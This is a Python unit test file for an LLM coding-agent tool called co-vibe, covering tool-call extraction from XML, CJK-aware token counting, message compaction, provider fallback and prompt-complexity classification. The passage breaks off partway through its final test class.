"""Core logic unit tests for co-vibe.py.

Covers:
1. XML tool call extraction (_extract_tool_calls_from_text, _try_parse_json_value)
2. Token estimation (_estimate_tokens) — CJK-aware
3. Message compaction (compact_if_needed, _enforce_max_messages)
4. Provider fallback (MultiProviderClient.chat rate-limit & error fallback)
5. Tier classification (_classify_complexity) — Japanese & English
"""

import json
import os
import sys
import time
import unittest
from unittest.mock import MagicMock, patch, PropertyMock
from types import SimpleNamespace
import tempfile
import importlib

# co-vibe uses a hyphen, so standard import won't work
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
co_vibe = importlib.import_module("co-vibe")

_extract_tool_calls_from_text = co_vibe._extract_tool_calls_from_text
_try_parse_json_value = co_vibe._try_parse_json_value
Session = co_vibe.Session
MultiProviderClient = co_vibe.MultiProviderClient
RateLimitError = co_vibe.RateLimitError
Config = co_vibe.Config
Agent = co_vibe.Agent


# ════════════════════════════════════════════════════════════════════════════════
# Helpers
# ════════════════════════════════════════════════════════════════════════════════

def _make_session_config(**overrides):
    """Create a minimal mock config for Session testing."""
    cfg = SimpleNamespace(
        session_id=None,
        sessions_dir=tempfile.mkdtemp(),
        cwd="/tmp/test_project",
        context_window=200000,
        sidecar_model="",
        debug=False,
        config_dir=tempfile.mkdtemp(),
    )
    for k, v in overrides.items():
        setattr(cfg, k, v)
    return cfg


def _make_client_config(**overrides):
    """Return a Config with sensible defaults for MultiProviderClient."""
    cfg = Config()
    cfg.max_tokens = 1024
    cfg.temperature = 0.7
    cfg.context_window = 128000
    cfg.debug = False
    cfg.anthropic_api_key = ""
    cfg.openai_api_key = ""
    cfg.groq_api_key = ""
    cfg.ollama_enabled = False
    cfg.ollama_base_url = "http://localhost:11434"
    cfg._ollama_models = []
    for k, v in overrides.items():
        setattr(cfg, k, v)
    return cfg


def _make_client(**overrides):
    """Build a MultiProviderClient with cleared env so only explicit keys count."""
    env_patch = {
        "ANTHROPIC_API_KEY": "",
        "OPENAI_API_KEY": "",
        "GROQ_API_KEY": "",
        "CO_VIBE_STRATEGY": "",
    }
    with patch.dict(os.environ, env_patch, clear=False):
        return MultiProviderClient(_make_client_config(**overrides))


# ════════════════════════════════════════════════════════════════════════════════
# 1. _try_parse_json_value
# ════════════════════════════════════════════════════════════════════════════════

class TestTryParseJsonValue(unittest.TestCase):

    def test_boolean_true(self):
        self.assertIs(_try_parse_json_value("true"), True)

    def test_boolean_false(self):
        self.assertIs(_try_parse_json_value("false"), False)

    def test_null(self):
        self.assertIsNone(_try_parse_json_value("null"))

    def test_integer(self):
        self.assertEqual(_try_parse_json_value("42"), 42)

    def test_negative_number(self):
        self.assertEqual(_try_parse_json_value("-3.14"), -3.14)

    def test_json_object(self):
        result = _try_parse_json_value('{"key": "value"}')
        self.assertEqual(result, {"key": "value"})

    def test_json_array(self):
        result = _try_parse_json_value('[1, 2, 3]')
        self.assertEqual(result, [1, 2, 3])

    def test_plain_string_returned_as_is(self):
        self.assertEqual(_try_parse_json_value("hello world"), "hello world")

    def test_empty_string_returned_as_is(self):
        self.assertEqual(_try_parse_json_value(""), "")

    def test_invalid_json_starting_with_brace(self):
        result = _try_parse_json_value("{not valid json")
        self.assertEqual(result, "{not valid json")


# ════════════════════════════════════════════════════════════════════════════════
# 2. _extract_tool_calls_from_text — Pattern 1 (invoke)
# ════════════════════════════════════════════════════════════════════════════════

class TestExtractToolCallsInvoke(unittest.TestCase):
    """Pattern 1: <invoke name="ToolName"><parameter name="p">v</parameter></invoke>"""

    def test_single_invoke(self):
        text = '<invoke name="Bash"><parameter name="cmd">ls -la</parameter></invoke>'
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["function"]["name"], "Bash")
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["cmd"], "ls -la")

    def test_multiple_parameters(self):
        text = (
            '<invoke name="WriteFile">'
            '<parameter name="path">/tmp/test.py</parameter>'
            '<parameter name="content">print("hello")</parameter>'
            '</invoke>'
        )
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["path"], "/tmp/test.py")
        self.assertEqual(args["content"], 'print("hello")')

    def test_xml_entity_decoding(self):
        """Issue #1: XML entities like &lt; &gt; &amp; should be decoded."""
        text = '<invoke name="Bash"><parameter name="cmd">echo &lt;hello&gt; &amp; world</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text)
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["cmd"], "echo <hello> & world")

    def test_tool_name_whitespace_stripped(self):
        """Issue #3: whitespace in tool names should be stripped."""
        text = '<invoke name=" Bash  "><parameter name="cmd">ls</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(calls[0]["function"]["name"], "Bash")

    def test_json_value_auto_parsed(self):
        """Issue #9: JSON values like true/false/numbers should be auto-parsed."""
        text = '<invoke name="Config"><parameter name="verbose">true</parameter><parameter name="count">5</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text)
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertIs(args["verbose"], True)
        self.assertEqual(args["count"], 5)

    def test_remaining_text_cleaned(self):
        text = 'Before the call. <invoke name="Bash"><parameter name="cmd">ls</parameter></invoke> After the call.'
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        self.assertNotIn("<invoke", remaining)
        self.assertIn("Before", remaining)
        self.assertIn("After", remaining)

    def test_call_id_format(self):
        """Issue #2: call IDs should use full uuid4 hex."""
        text = '<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertTrue(calls[0]["id"].startswith("call_"))
        # uuid4 hex is 32 chars
        self.assertEqual(len(calls[0]["id"]), len("call_") + 32)

    def test_known_tools_filter(self):
        """When known_tools is provided, unknown tools should be filtered out."""
        text = '<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"ReadFile"})
        self.assertEqual(len(calls), 0)

    def test_known_tools_allows_matching(self):
        text = '<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"Bash"})
        self.assertEqual(len(calls), 1)


# ════════════════════════════════════════════════════════════════════════════════
# 3. _extract_tool_calls_from_text — Pattern 2 (Qwen format)
# ════════════════════════════════════════════════════════════════════════════════

class TestExtractToolCallsQwen(unittest.TestCase):
    """Pattern 2: <function=ToolName><parameter=param>value</parameter></function>"""

    def test_qwen_format(self):
        text = '<function=Bash><parameter=cmd>ls -la</parameter></function>'
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["function"]["name"], "Bash")
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["cmd"], "ls -la")

    def test_qwen_multiple_params(self):
        text = (
            '<function=WriteFile>'
            '<parameter=path>/tmp/test.txt</parameter>'
            '<parameter=content>hello world</parameter>'
            '</function>'
        )
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["path"], "/tmp/test.txt")
        self.assertEqual(args["content"], "hello world")

    def test_qwen_no_params_ignored(self):
        """Qwen pattern with no parameters should not produce a tool call."""
        text = '<function=Bash></function>'
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 0)


# ════════════════════════════════════════════════════════════════════════════════
# 4. _extract_tool_calls_from_text — Pattern 3 (simple XML)
# ════════════════════════════════════════════════════════════════════════════════

class TestExtractToolCallsSimpleXml(unittest.TestCase):
    """Pattern 3: <ToolName><param>val</param></ToolName> (requires known_tools)."""

    def test_simple_xml_with_known_tools(self):
        text = '<Bash><cmd>ls -la</cmd></Bash>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"Bash"})
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["function"]["name"], "Bash")
        args = json.loads(calls[0]["function"]["arguments"])
        self.assertEqual(args["cmd"], "ls -la")

    def test_simple_xml_without_known_tools_ignored(self):
        """Pattern 3 only activates when known_tools is provided."""
        text = '<Bash><cmd>ls</cmd></Bash>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools=None)
        self.assertEqual(len(calls), 0)

    def test_simple_xml_no_params_ignored(self):
        """Pattern 3 with no inner parameter tags should not produce a call."""
        text = '<Bash>just text</Bash>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"Bash"})
        self.assertEqual(len(calls), 0)


# ════════════════════════════════════════════════════════════════════════════════
# 5. _extract_tool_calls_from_text — Edge cases
# ════════════════════════════════════════════════════════════════════════════════

class TestExtractToolCallsEdgeCases(unittest.TestCase):

    def test_no_xml_returns_empty(self):
        text = "Just plain text with no XML at all."
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(calls, [])
        self.assertEqual(remaining, text.strip())

    def test_code_block_ignored(self):
        """Tool calls inside code blocks should not be extracted (Issue #5)."""
        text = '```\n<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>\n```'
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 0)

    def test_inline_code_ignored(self):
        """Tool calls inside inline backticks should not be extracted."""
        text = 'Use `<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>` for shell commands.'
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 0)

    def test_deduplication(self):
        """Duplicate tool calls from overlapping patterns should be deduped."""
        # This can happen when both invoke and simple patterns match the same call
        text = '<invoke name="Bash"><parameter name="cmd">ls</parameter></invoke>'
        # With known_tools, both patterns could potentially match if the XML format
        # also matches pattern 3. With invoke pattern, only pattern 1 applies.
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"Bash"})
        # Should get exactly 1 call (deduplication handles overlaps)
        names = [c["function"]["name"] for c in calls]
        self.assertEqual(names.count("Bash"), 1)

    def test_wrapper_tags_cleaned(self):
        """Issue #8: function_calls, action, tool_call wrapper tags should be cleaned."""
        text = '<function_calls><invoke name="Bash"><parameter name="cmd">ls</parameter></invoke></function_calls>'
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 1)
        self.assertNotIn("<function_calls>", remaining)
        self.assertNotIn("</function_calls>", remaining)

    def test_quick_bail_no_closing_tags(self):
        """Issue #4: text without closing tags should bail out fast."""
        text = "This has < angle brackets but no closing tags at all"
        calls, remaining = _extract_tool_calls_from_text(text)
        self.assertEqual(calls, [])

    def test_multiple_tool_calls(self):
        text = (
            '<invoke name="ReadFile"><parameter name="path">/tmp/a.txt</parameter></invoke>'
            '<invoke name="Bash"><parameter name="cmd">pwd</parameter></invoke>'
        )
        calls, _ = _extract_tool_calls_from_text(text)
        self.assertEqual(len(calls), 2)
        names = {c["function"]["name"] for c in calls}
        self.assertEqual(names, {"ReadFile", "Bash"})

    def test_known_tools_filters_all_patterns(self):
        """Issue #10: known_tools filter applies to all patterns' results."""
        text = '<invoke name="DangerousTool"><parameter name="x">1</parameter></invoke>'
        calls, _ = _extract_tool_calls_from_text(text, known_tools={"Bash", "ReadFile"})
        self.assertEqual(len(calls), 0)


# ════════════════════════════════════════════════════════════════════════════════
# 6. _estimate_tokens — CJK-aware
# ════════════════════════════════════════════════════════════════════════════════

class TestEstimateTokensCJK(unittest.TestCase):
    """Extends the basic tests in test_session.py with more CJK scenarios."""

    def test_hiragana(self):
        text = "あいうえお"  # 5 hiragana chars
        self.assertEqual(Session._estimate_tokens(text), 5)

    def test_katakana(self):
        text = "アイウエオ"  # 5 katakana chars
        self.assertEqual(Session._estimate_tokens(text), 5)

    def test_cjk_ext_a(self):
        text = "\u3400\u3401"  # 2 CJK ext-A chars
        self.assertEqual(Session._estimate_tokens(text), 2)

    def test_cjk_punctuation(self):
        text = "\u3000\u3001\u3002"  # 3 CJK symbols/punctuation (ideographic space, comma, period)
        self.assertEqual(Session._estimate_tokens(text), 3)

    def test_katakana_ext(self):
        text = "\u31f0\u31f1"  # 2 katakana ext chars
        self.assertEqual(Session._estimate_tokens(text), 2)

    def test_fullwidth_forms(self):
        text = "\uff01\uff1f\uff21"  # fullwidth !, ?, A
        self.assertEqual(Session._estimate_tokens(text), 3)

    def test_korean_hangul(self):
        text = "\uac00\uac01\uac02"  # 3 Korean characters
        self.assertEqual(Session._estimate_tokens(text), 3)

    def test_mixed_japanese_english(self):
        """Realistic Japanese sentence with English mixed in."""
        text = "Pythonのコードを書いてください"  # "Python" (6 ASCII) + rest (10 CJK-ish)
        tokens = Session._estimate_tokens(text)
        # CJK chars count as 1 each, ASCII as len//4
        self.assertGreater(tokens, 0)
        # The 6 ASCII chars contribute 6//4 = 1, and the CJK chars contribute ~10
        # Exact count depends on which chars fall in CJK ranges
        self.assertGreater(tokens, 5)

    def test_empty_returns_zero(self):
        self.assertEqual(Session._estimate_tokens(""), 0)

    def test_none_returns_zero(self):
        self.assertEqual(Session._estimate_tokens(None), 0)

    def test_pure_ascii(self):
        text = "Hello world this is a test"
        self.assertEqual(Session._estimate_tokens(text), len(text) // 4)


# ════════════════════════════════════════════════════════════════════════════════
# 7. _enforce_max_messages — edge cases
# ════════════════════════════════════════════════════════════════════════════════

class TestEnforceMaxMessagesEdgeCases(unittest.TestCase):

    def test_orphaned_tool_at_cut_boundary_advanced(self):
        """When the cut point lands on tool results, they should be skipped."""
        s = Session(_make_session_config(), "prompt")
        # Create a sequence that overflows and has tool results at the boundary
        for i in range(Session.MAX_MESSAGES - 5):
            s.messages.append({"role": "user", "content": f"msg {i}"})
        # Add assistant with tool_calls
        s.messages.append({
            "role": "assistant", "content": None,
            "tool_calls": [{"id": "tc1", "function": {"name": "Bash", "arguments": "{}"}}]
        })
        # Add tool results
        for i in range(10):
            s.messages.append({"role": "tool", "tool_call_id": f"tc{i}", "content": f"result {i}"})
        s._enforce_max_messages()
        # First message should NOT be a tool result
        self.assertNotEqual(s.messages[0].get("role"), "tool")

    def test_leading_assistant_with_orphaned_tool_calls_dropped(self):
        """BUG-9: If first message is assistant with tool_calls but no following tool result, drop it."""
        s = Session(_make_session_config(), "prompt")
        # Overflow so trimming occurs
        for i in range(Session.MAX_MESSAGES + 20):
            s.messages.append({"role": "user", "content": f"msg {i}"})
        # Manually set first message to be an orphaned assistant with tool_calls
        s.messages[0] = {
            "role": "assistant", "content": None,
            "tool_calls": [{"id": "tc1", "function": {"name": "Bash", "arguments": "{}"}}]
        }
        s._enforce_max_messages()
        # After enforcement, first message shouldn't be orphaned assistant with tool_calls
        if s.messages[0].get("role") == "assistant" and s.messages[0].get("tool_calls"):
            # If it IS an assistant with tool_calls, the next message must be a tool result
            self.assertEqual(s.messages[1].get("role"), "tool")

    def test_all_tool_results_fallback(self):
        """If all remaining messages are tool results, should keep some messages."""
        s = Session(_make_session_config(), "prompt")
        for i in range(Session.MAX_MESSAGES + 10):
            s.messages.append({"role": "tool", "tool_call_id": f"tc{i}", "content": f"r{i}"})
        s._enforce_max_messages()
        # Should never be empty
        self.assertGreater(len(s.messages), 0)

    def test_guard_never_empties(self):
        """Guard: the message list should never become empty."""
        s = Session(_make_session_config(), "prompt")
        for i in range(Session.MAX_MESSAGES + 50):
            s.messages.append({"role": "user", "content": f"msg {i}"})
        s._enforce_max_messages()
        self.assertGreater(len(s.messages), 0)
        # Check the fallback message
        if len(s.messages) == 1 and s.messages[0]["content"] == "(history trimmed)":
            self.assertEqual(s.messages[0]["role"], "user")


# ════════════════════════════════════════════════════════════════════════════════
# 8. compact_if_needed — detailed scenarios
# ════════════════════════════════════════════════════════════════════════════════

class TestCompactIfNeededDetailed(unittest.TestCase):

    def test_no_op_under_threshold(self):
        s = Session(_make_session_config(context_window=200000), "prompt")
        for i in range(5):
            s.add_user_message(f"msg {i}")
        before = len(s.messages)
        s.compact_if_needed()
        self.assertEqual(len(s.messages), before)

    def test_force_compaction_below_threshold(self):
        s = Session(_make_session_config(context_window=200000, sidecar_model=""), "prompt")
        s._client = None
        for i in range(50):
            s.add_user_message(f"msg {i}")
        before = len(s.messages)
        s.compact_if_needed(force=True)
        self.assertLess(len(s.messages), before)

    def test_auto_force_over_300_messages(self):
        """When >300 messages, compact_if_needed should auto-force."""
        s = Session(_make_session_config(context_window=999999, sidecar_model=""), "prompt")
        s._client = None
        for i in range(310):
            s.messages.append({"role": "user", "content": f"msg {i}"})
        s._recalculate_tokens()
        before = len(s.messages)
        s.compact_if_needed()  # no force param, but >300 messages triggers auto-force
        self.assertLess(len(s.messages), before)

    def test_prevents_infinite_recompaction(self):
        """Should not re-compact if message count hasn't changed since last compaction."""
        s = Session(_make_session_config(context_window=100, sidecar_model=""), "prompt")
        s._client = None
        for i in range(50):
            s.add_user_message("x" * 100)
        s.compact_if_needed()
        after_first = len(s.messages)
        # Call again without adding messages
        s.compact_if_needed()
        self.assertEqual(len(s.messages), after_first)

    def test_sidecar_summarization_creates_summary_message(self):
        cfg = _make_session_config(context_window=1000, sidecar_model="mock-model")
        s = Session(cfg, "prompt")
        mock_client = MagicMock()
        mock_client.chat.return_value = {
            "choices": [{"message": {"content": "- Summary of conversation\n- Key decisions"}}]
        }
        s.set_client(mock_client)
        for i in range(200):
            s.add_user_message("x" * 100)
        s.compact_if_needed()
        summary_msgs = [m for m in s.messages
                        if "[Earlier conversation summary]" in (m.get("content") or "")]
        self.assertGreater(len(summary_msgs), 0)

    def test_sidecar_failure_falls_back_to_drop(self):
        """If sidecar summarization fails, should fall back to dropping old messages."""
        cfg = _make_session_config(context_window=1000, sidecar_model="mock-model")
        s = Session(cfg, "prompt")
        mock_client = MagicMock()
        mock_client.chat.side_effect = OSError("sidecar down")
        s.set_client(mock_client)
        for i in range(200):
            s.add_user_message("x" * 100)
        before = len(s.messages)
        s.compact_if_needed()
        self.assertLess(len(s.messages), before)

    def test_orphaned_tool_results_skipped_after_compaction(self):
        """After compaction, message list should not start with orphaned tool results."""
        s = Session(_make_session_config(context_window=500, sidecar_model=""), "prompt")
        s._client = None
        # Build up messages so compaction occurs, with tool results mixed in
        for i in range(100):
            s.messages.append({"role": "user", "content": f"msg {i} " + "x" * 50})
        for i in range(5):
            s.messages.append({"role": "tool", "tool_call_id": f"tc{i}", "content": "result"})
        for i in range(100):
            s.messages.append({"role": "user", "content": f"msg {i+100} " + "x" * 50})
        s._recalculate_tokens()
        s.compact_if_needed()
        if s.messages:
            self.assertNotEqual(s.messages[0].get("role"), "tool")


# ════════════════════════════════════════════════════════════════════════════════
# 9. Provider health tracking
# ════════════════════════════════════════════════════════════════════════════════

class TestProviderHealth(unittest.TestCase):

    def test_new_provider_is_healthy(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        self.assertTrue(client._is_provider_healthy("anthropic"))

    def test_mark_unhealthy(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        client._mark_provider_unhealthy("anthropic", "rate limited")
        self.assertFalse(client._is_provider_healthy("anthropic"))

    def test_mark_healthy_resets(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        client._mark_provider_unhealthy("anthropic", "rate limited")
        self.assertFalse(client._is_provider_healthy("anthropic"))
        client._mark_provider_healthy("anthropic")
        self.assertTrue(client._is_provider_healthy("anthropic"))

    def test_cooldown_expires(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        client._health_cooldown = 1  # 1 second cooldown for testing
        client._mark_provider_unhealthy("anthropic", "rate limited")
        self.assertFalse(client._is_provider_healthy("anthropic"))
        # Simulate time passing
        client._provider_health["anthropic"]["last_fail"] = time.time() - 2
        self.assertTrue(client._is_provider_healthy("anthropic"))

    def test_failure_count_increments(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        client._mark_provider_unhealthy("anthropic", "error 1")
        client._mark_provider_unhealthy("anthropic", "error 2")
        self.assertEqual(client._provider_health["anthropic"]["failures"], 2)

    def test_get_provider_status(self):
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
        )
        client._mark_provider_unhealthy("anthropic", "rate limited")
        status = client.get_provider_status()
        self.assertIn("anthropic", status)
        self.assertIn("openai", status)
        self.assertEqual(status["anthropic"]["status"], "unhealthy")
        self.assertEqual(status["openai"]["status"], "healthy")


# ════════════════════════════════════════════════════════════════════════════════
# 10. _get_cross_tier_fallbacks
# ════════════════════════════════════════════════════════════════════════════════

class TestGetCrossTierFallbacks(unittest.TestCase):

    def test_strong_falls_to_balanced_then_fast(self):
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
        )
        fallbacks = client._get_cross_tier_fallbacks("claude-opus-4-6")
        tiers = [t for _, _, t in fallbacks]
        # Strong should fallback to balanced and fast
        self.assertIn("balanced", tiers)
        self.assertIn("fast", tiers)

    def test_balanced_falls_to_fast_only(self):
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
        )
        fallbacks = client._get_cross_tier_fallbacks("claude-sonnet-4-6")
        tiers = set(t for _, _, t in fallbacks)
        self.assertIn("fast", tiers)
        self.assertNotIn("strong", tiers)

    def test_fast_has_no_cross_tier_fallback(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        fallbacks = client._get_cross_tier_fallbacks("claude-haiku-4-5-20251001")
        self.assertEqual(fallbacks, [])

    def test_unknown_model_returns_empty(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        fallbacks = client._get_cross_tier_fallbacks("nonexistent-model-xyz")
        self.assertEqual(fallbacks, [])


# ════════════════════════════════════════════════════════════════════════════════
# 11. MultiProviderClient.chat — rate limit fallback
# ════════════════════════════════════════════════════════════════════════════════

class TestChatRateLimitFallback(unittest.TestCase):

    def test_rate_limit_triggers_fallback(self):
        """On 429, should try fallback provider instead of waiting."""
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
        )
        call_log = []

        def mock_http(url, body, headers, **kw):
            call_log.append(url)
            if "anthropic" in url:
                raise RateLimitError("Rate limited", retry_after=1.0)
            return {
                "id": "chatcmpl-fb",
                "object": "chat.completion",
                "model": "gpt-4o",
                "choices": [{
                    "index": 0,
                    "message": {"role": "assistant", "content": "Fallback"},
                    "finish_reason": "stop",
                }],
                "usage": {"prompt_tokens": 5, "completion_tokens": 3, "total_tokens": 8},
            }

        with patch.object(client, "_http_request", side_effect=mock_http):
            result = client.chat(
                model="claude-sonnet-4-6",
                messages=[{"role": "user", "content": "Hi"}],
                stream=False,
            )
        self.assertEqual(result["choices"][0]["message"]["content"], "Fallback")
        # Should have tried anthropic first, then openai
        self.assertTrue(any("anthropic" in u for u in call_log))
        self.assertTrue(any("openai" in u for u in call_log))

    def test_max_retries_raises_error(self):
        """After MAX_RETRIES, should raise RuntimeError instead of looping forever."""
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")

        with patch.object(client, "_http_request",
                          side_effect=RateLimitError("Rate limited", retry_after=0.01)):
            with patch("time.sleep"):  # skip actual waits
                with self.assertRaises(RuntimeError) as ctx:
                    client.chat(
                        model="claude-sonnet-4-6",
                        messages=[{"role": "user", "content": "Hi"}],
                        stream=False,
                    )
                self.assertIn("rate-limited", str(ctx.exception).lower())

    def test_runtime_error_fallback(self):
        """Non-rate-limit RuntimeError should trigger immediate fallback."""
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
        )

        def mock_http(url, body, headers, **kw):
            if "anthropic" in url:
                raise RuntimeError("API error (HTTP 500): internal server error")
            return {
                "id": "chatcmpl-fb",
                "object": "chat.completion",
                "model": "gpt-4o",
                "choices": [{
                    "index": 0,
                    "message": {"role": "assistant", "content": "OK"},
                    "finish_reason": "stop",
                }],
                "usage": {"prompt_tokens": 5, "completion_tokens": 3, "total_tokens": 8},
            }

        with patch.object(client, "_http_request", side_effect=mock_http):
            result = client.chat(
                model="claude-sonnet-4-6",
                messages=[{"role": "user", "content": "Hi"}],
                stream=False,
            )
        self.assertEqual(result["choices"][0]["message"]["content"], "OK")

    def test_success_marks_provider_healthy(self):
        """Successful request should mark provider as healthy."""
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        client._mark_provider_unhealthy("anthropic", "previous error")

        mock_resp = {
            "id": "msg_test",
            "model": "claude-sonnet-4-6",
            "content": [{"type": "text", "text": "OK"}],
            "stop_reason": "end_turn",
            "usage": {"input_tokens": 5, "output_tokens": 3},
        }
        with patch.object(client, "_http_request", return_value=mock_resp):
            client.chat(
                model="claude-sonnet-4-6",
                messages=[{"role": "user", "content": "Hi"}],
                stream=False,
            )
        self.assertTrue(client._is_provider_healthy("anthropic"))


# ════════════════════════════════════════════════════════════════════════════════
# 12. _classify_complexity — English inputs
# ════════════════════════════════════════════════════════════════════════════════

class TestClassifyComplexityEnglish(unittest.TestCase):

    @staticmethod
    def _classify(text):
        # Access from co_vibe module — it's a static method on the Orchestrator class
        # We need to find the class that has _classify_complexity
        return Agent._classify_complexity(text)

    def test_empty_returns_balanced(self):
        self.assertEqual(self._classify(""), "balanced")

    def test_none_returns_balanced(self):
        self.assertEqual(self._classify(None), "balanced")

    # ── Strong indicators ──

    def test_architect_is_strong(self):
        self.assertEqual(self._classify("architect a new microservice system"), "strong")

    def test_refactor_is_strong(self):
        self.assertEqual(self._classify("refactor the entire authentication module"), "strong")

    def test_across_files_is_strong(self):
        self.assertEqual(self._classify("make changes across files in the project"), "strong")

    def test_complex_debug_is_strong(self):
        self.assertEqual(self._classify("debug complex race condition in the server"), "strong")

    def test_security_audit_is_strong(self):
        self.assertEqual(self._classify("perform a security audit of the codebase"), "strong")

    def test_long_complex_prompt_is_strong(self):
        """Long prompt (>500 chars) with code blocks should be classified as strong."""
        text = "Please implement the following features:\n" + "x" * 450 + "\n```python\nprint('hello')\n```\n```python\nprint('world')\n```"
        self.assertGreater(len(text), 500)
        self.assertEqual(self._classify(text), "strong")

    def test_plan_strategy_is_strong(self):
        self.assertEqual(self._classify("plan how should implement the new feature"), "strong")

    def test_comprehensive_is_strong(self):
        self.assertEqual(self._classify("do a comprehensive review of all modules"), "strong")

    # ── Fast indicators ──

    def test_yes_is_fast(self):
        self.assertEqual(self._classify("yes"), "fast")

    def test_no_is_fast(self):
        self.assertEqual(self._classify("no"), "fast")

    def test_ok_is_fast(self):
        self.assertEqual(self._classify("ok"), "fast")

    def test_very_short_input_is_fast(self):
        self.assertEqual(self._classify("hi"), "fast")

    def test_simple_question_short_is_fast(self):
        result = self._classify("what is X?")
        self.assertEqual(result, "fast")

    # ── Balanced indicators ──

    def test_moderate_request_is_balanced(self):
        self.assertEqual(self._classify("fix the bug in login.py where the token expires"), "balanced")

    def test_simple_question_with_tech_term_is_balanced(self):
        """A simple question that includes a technical term should escalate to balanced."""
        result = self._classify("what is the database schema for user authentication?")
        self.assertEqual(result, "balanced")

    def test_short_question_with_filepath(self):
        """Question mentioning a file path signals complexity."""
        result = self._classify("what does /src/auth/login.py do?")
        self.assertEqual(result, "balanced")

    def test_implement_request_balanced(self):
        result = self._classify("implement a simple logger class")
        self.assertEqual(result, "balanced")


# ════════════════════════════════════════════════════════════════════════════════
# 13. _classify_complexity — Japanese inputs
# ════════════════════════════════════════════════════════════════════════════════

class TestClassifyComplexityJapanese(unittest.TestCase):

    @staticmethod
    def _classify(text):
        return Agent._classify_complexity(text)

    # ── Strong ──

    def test_sekkei_is_strong(self):
        """設計 (design/architecture) should trigger strong."""
        self.assertEqual(self._classify("新しいマイクロサービスの設計をしてください"), "strong")

    def test_refactoring_is_strong(self):
        """リファクタ should trigger strong."""
        self.assertEqual(self._classify("認証モジュールのリファクタリング"), "strong")

    def test_daikibo_is_strong(self):
        """大規模 (large-scale) should trigger strong."""
        self.assertEqual(self._classify("大規模なコード変更"), "strong")

    def test_deep_research_is_strong(self):
        """ディープリサーチ should trigger strong."""
        self.assertEqual(self._classify("ディープリサーチを行ってください"), "strong")

    def test_survey_paper_is_strong(self):
        """サーベイ should trigger strong."""
        self.assertEqual(self._classify("サーベイ論文を書いて"), "strong")

    def test_owarunade_is_strong(self):
        """終わるまで (until finished) should trigger strong."""
        self.assertEqual(self._classify("終わるまで修正し続けて"), "strong")

    def test_zenbu_naose_is_strong(self):
        """全部直して should trigger strong."""
        self.assertEqual(self._classify("全部直してください"), "strong")

    # ── Fast ──

    def test_hai_is_fast(self):
        self.assertEqual(self._classify("はい"), "fast")

    def test_iie_is_fast(self):
        self.assertEqual(self._classify("いいえ"), "fast")

    def test_un_is_fast(self):
        self.assertEqual(self._classify("うん"), "fast")

    def test_sou_is_fast(self):
        self.assertEqual(self._classify("そう"), "fast")

    def test_short_nani_question_fast(self):
        """Short question like 何？ should be fast."""
        self.assertEqual(self._classify("何？"), "fast")

    # ── Balanced ──

    def test_moderate_japanese_request(self):
        result = self._classify("このファイルのバグを修正してください")
        self.assertEqual(result, "balanced")

    def test_japanese_with_tech_term(self):
        """Japanese with technical term should be balanced."""
        result = self._classify("データベースのスキーマを確認して")
        self.assertEqual(result, "balanced")


# ════════════════════════════════════════════════════════════════════════════════
# 14. _get_fallback_models — tier-aware
# ════════════════════════════════════════════════════════════════════════════════

class TestGetFallbackModelsTierAware(unittest.TestCase):

    def test_same_tier_prioritized(self):
        """When intended_tier is specified, same-tier models come first."""
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
            groq_api_key="gsk_TESTKEY123456789",
        )
